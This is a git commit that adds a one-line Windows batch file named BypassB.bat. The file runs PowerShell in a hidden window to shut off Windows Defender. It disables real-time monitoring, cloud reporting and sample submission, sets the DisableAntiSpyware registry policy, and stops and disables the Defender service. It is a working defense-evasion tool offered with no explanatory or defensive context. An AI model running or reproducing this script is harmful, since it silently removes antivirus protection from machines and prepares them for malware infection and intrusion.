f7e682d14abe1bc11a972ac11367aea24d45b931
v-0v <108912188+v-0v@users.noreply.github.com>
2024-09-28 00:42:25 +0300

    Add files via upload

---
+++ BypassB.bat
@@ -0,0 +1,1 @@
+powershell -windowstyle hidden -command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -MAPSReporting Disabled; Set-MpPreference -SubmitSamplesConsent 2; Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1; Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled"
